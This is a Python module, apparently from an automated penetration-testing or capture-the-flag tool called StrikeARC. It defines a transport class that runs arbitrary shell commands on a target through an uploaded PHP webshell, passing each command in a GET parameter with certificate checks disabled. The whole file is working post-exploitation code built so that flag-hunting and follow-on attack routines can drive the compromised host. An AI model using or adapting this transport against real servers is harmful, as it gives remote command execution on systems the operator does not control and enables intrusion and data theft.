"""HTTP webshell transport (v8.4.0).

Wraps an uploaded webshell URL (e.g. /uploads/sh.php?c=id) in the same
.run()/.alive() contract as SSHCredTransport so flag_hunter and
post-exploit code can execute commands on the target through it.

Created because _get_transport_for_host was a stub returning None: every
flag hunt in runs 1-18 searched the ATTACK BOX instead of the target.
"""
from urllib.parse import quote

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class WebshellTransport:
    """Execute commands through a GET-param webshell (?param=cmd)."""

    def __init__(self, url: str, param: str = "c", proto: str = "http",
                 timeout: int = 12):
        self.url = url
        self.param = param
        self.timeout = timeout
        self._session = requests.Session()
        self._session.headers["User-Agent"] = "StrikeARC"

    def run(self, cmd: str, timeout: int | None = None) -> dict:
        sep = "&" if "?" in self.url else "?"
        full = f"{self.url}{sep}{self.param}={quote(cmd)}"
        try:
            resp = self._session.get(full, timeout=timeout or self.timeout,
                                     verify=False)
            out = resp.text or ""
            return {"stdout": out, "stderr": "",
                    "exit_code": resp.status_code}
        except Exception as exc:  # noqa: BLE001 — target may die mid-hunt
            return {"stdout": "", "stderr": str(exc), "exit_code": -1}

    def alive(self) -> bool:
        try:
            r = self.run("echo strikearc_alive")
            return "strikearc_alive" in (r.get("stdout") or "")
        except Exception:
            return False
